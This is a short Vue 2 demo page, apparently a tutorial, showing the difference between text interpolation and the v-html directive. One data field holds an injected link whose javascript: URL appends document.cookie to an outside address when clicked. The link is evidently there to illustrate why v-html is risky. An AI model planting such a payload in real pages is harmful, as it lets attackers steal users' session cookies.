<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>标题</title>

    <script src="../js/vue2/vue.js"></script>
<body>
    <div id="root">
        <div>{{ str }}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>

    <script>
        new Vue({
            el: '#root',
            data: {
                str: '<h2>你好</h2>',

                // javascript:后不能加空格
                str2: '<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>快点我！</a>'
            }
        })
    </script>
</body>
</html>
